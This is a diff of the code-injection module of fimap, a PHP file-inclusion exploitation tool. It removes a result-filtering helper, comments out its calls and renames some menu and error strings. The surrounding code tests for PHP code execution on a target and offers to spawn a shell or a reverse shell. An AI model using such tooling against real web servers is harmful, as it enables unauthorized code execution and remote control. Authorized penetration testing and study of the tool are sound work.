@@ -26,9 +26,6 @@ import urllib2
 __author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
 __date__ ="$03.09.2009 03:40:49$"
 
-begin_of_out = "HTTP_USER_AGENT="
-end_of_out = "PATH="
-
 shell_banner =  "-------------------------------------------\n" + \
                 "Welcome to fimap shell!\n" + \
                 "Better don't start interactive commands! ;)\n" +\
@@ -73,7 +70,7 @@ class codeinjector(baseClass):
             code = self.doGetRequest(url)
             if (code.find(settings["php_info"][1]) != -1):
                 self._log("PHP Injection works! Testing if execution works...", self.globSet.LOG_ALWAYS)
-                self.filterResult(code, hostname)
+                #self.filterResult(code, hostname)
                 for item in settings["php_exec"]:
                     name, payload = item
                     self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_INFO)
@@ -120,7 +117,7 @@ class codeinjector(baseClass):
             code = self.doPostRequest(url, settings["php_info"][0])
             if (code.find(settings["php_info"][1]) != -1):
                 self._log("PHP Injection works! Testing if execution works...", self.globSet.LOG_ALWAYS)
-                self.filterResult(code, hostname)
+                #self.filterResult(code, hostname)
                 for item in settings["php_exec"]:
                     name, payload = item
                     self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_ALWAYS)
@@ -210,14 +207,14 @@ class codeinjector(baseClass):
     def chooseAttackMode(self):
         header = "Available Attacks"
         textarr = []
-        textarr.append("[1] Spawn Shell")
+        textarr.append("[1] Spawn shell")
         textarr.append("[2] Create reverse shell...")
         self.drawBox(header, textarr)
         try:
             tech = raw_input("Choose Attack: ")
             tech = int(tech)
         except:
-            print "Invalid attack tech."
+            print "Invalid attack mode."
             sys.exit(1)
 
         return(tech)
@@ -235,17 +232,8 @@ class codeinjector(baseClass):
             f.close()
             code = self.doGetRequest(URL)
             return(code)
-    def filterResult(self, code, hostname):
-        begin = begin_of_out.replace("__HOST_NAME__", hostname)
-        c = ""
-        for i in code:
-            if (ord(i) < 128):
-                c = c + i
-        code = c
-        code = code[code.find(begin)+len(begin):]
-        code = code[:code.rfind(end_of_out)]
-        return(code)
 
+    
     def chooseDomains(self):
         choose = {}
         nodes = self.getDomainNodes()
@@ -293,5 +281,5 @@ class codeinjector(baseClass):
             c = int(c)
             return(choose[c])
         except:
-            print "Invalid Domain ID."
+            print "Invalid script ID."
             sys.exit(1)
